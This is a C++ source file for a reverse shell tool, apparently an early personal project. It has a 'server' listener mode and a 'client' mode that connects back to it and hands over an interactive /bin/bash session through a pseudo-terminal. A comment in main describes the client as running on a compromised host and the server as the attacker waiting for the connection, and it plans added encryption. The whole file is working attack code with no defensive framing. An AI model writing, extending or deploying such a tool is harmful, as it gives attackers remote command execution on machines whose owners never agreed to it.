#include "utils.h"
#include "args_parser.h"

// error msgs
std::string pipeFailed = "[!] Pipe creation failed!";
std::string forkFailed = "[!] Fork creation failed!";
std::string execlFailed = "[!] Execl failed!";
std::string failedToOpenClientSoc = "[!] Failed to create client socket!";
std::string serverDisconnected = "[!] Server Disconnected!";
std::string failedToAcceptClient = "[!] Failed to accept incoming connection!";

// placeholder for now
void server(const std::string &serverIpAddr, unsigned int portNum) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocket < 0) {
        std::cout << "Failed to create server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET; // define IPV4
    serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
    serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)

    // check bind is okay
    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cout << "Failed to bind server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // check we can listen on bind
    if (listen(serverSocket, 5) < 0) {
        std::cout << "Failed to listen on server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    std::cout << "[+] Server listening on " << serverIpAddr << ":" << portNum << std::endl;

    // get info on connecting client
    struct sockaddr_storage clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    char clientIpAddr[INET_ADDRSTRLEN];

    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);

    // check we were able to accept connection from client
    if (clientSocket < 0) {
        safeShutdown(failedToAcceptClient, serverSocket, clientSocket);
    }

    // get some info for server user
    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
    int clientPort = ntohs(s->sin_port); // converts byte to port number
    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;

    fd_set fdSet;
    char ttyBuffer[4096];
    while (true) {
        // setting up select() func
        FD_ZERO(&fdSet);
        FD_SET(clientSocket, &fdSet); // data from client
        FD_SET(STDIN_FILENO, &fdSet); // data from stdin

        int maxFd = std::max(clientSocket, STDIN_FILENO) + 1;
        // see if we are getting any data from the client or from our own stdin
        int activity = select(maxFd, &fdSet, nullptr, nullptr, nullptr);

        if (activity < 0 ) {
            break;
        }

        // Data from client -> server
        if (FD_ISSET(clientSocket, &fdSet)) {
            // read incoming data
            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
            // if no data, client has disconnected and we can exit
            if (bytesReceived <= 0) {
                std::cout << "[!] Client disconnected" << std::endl;
                break;
            }
            // print output from client
            std::cout.write(ttyBuffer, bytesReceived);
            std::cout.flush();
        }

        // Data from input -> to then send to client
        if (FD_ISSET(STDIN_FILENO, &fdSet)) {
            // read input
            ssize_t input = read(STDIN_FILENO, ttyBuffer, sizeof(ttyBuffer));

            if (input > 0) {
                // if input is 'exit' we know we want to quit
                std::string inputCmd(ttyBuffer, input);
                if (inputCmd.find("exit") != std::string::npos) {
                    // execute shutdown
                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket);
                }

                // if not 'exit' send to client
                send(clientSocket, ttyBuffer, input, 0);
            }
        }
    }
    close(clientSocket);
    close(serverSocket);
}


void client(const std::string &ipAddr, unsigned int portNum) {

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (clientSocket < 0) {
        std::cout << "Failed to create client socket!" << std::endl;
        exit(1);
    }

    // socket info
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());
    char socket_buffer[1024];

    if (connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) < 0) {
        std::cout << "Failed to connect to server!" << std::endl;
        close(clientSocket);
        exit(-1);
    }

    std::cout << "[+] Connected to server successfully" << std::endl;

    int masterFd;
    pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);

    if (childPid < 0) {
        safeShutdown(forkFailed, clientSocket, masterFd);
    }
    if (childPid == 0) {
        execl("/bin/bash", "bash", nullptr);
        safeShutdown(execlFailed, clientSocket, masterFd);
    }

    fd_set fds;
    char ttyBuffer[4096];

    while (true) {
        FD_ZERO(&fds);
        FD_SET(clientSocket, &fds);
        FD_SET(masterFd, &fds);

        int maxFd = std::max(clientSocket, masterFd) + 1;
        int activity = select(maxFd, &fds, nullptr, nullptr, nullptr);
        if (activity < 0 ) {
            break;
        }

        // from server to tty
        if (FD_ISSET(clientSocket, &fds)) {
            ssize_t bytesReceived = recv(clientSocket, ttyBuffer, sizeof(ttyBuffer), 0);
            if (bytesReceived <= 0) {
                std::cout << serverDisconnected << std::endl;
                break;
            }
            write(masterFd, ttyBuffer, bytesReceived);
        }

        if (FD_ISSET(masterFd, &fds)) {
            ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
            if (n > 0) {
                send(clientSocket, ttyBuffer, n, 0);
            }
        }
    }

    close(clientSocket);
    close(masterFd);
    wait(nullptr);
}


int main(int argc, char *argv[]) {


    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we just need one parameter and that's a port number to listen on (default 443)
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the 'server'
     *
     *  then connect and set up an encrypted rev shell (method undecided)
     */
    struct config cfg = parse_args(argc, argv);

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    return 0;
}

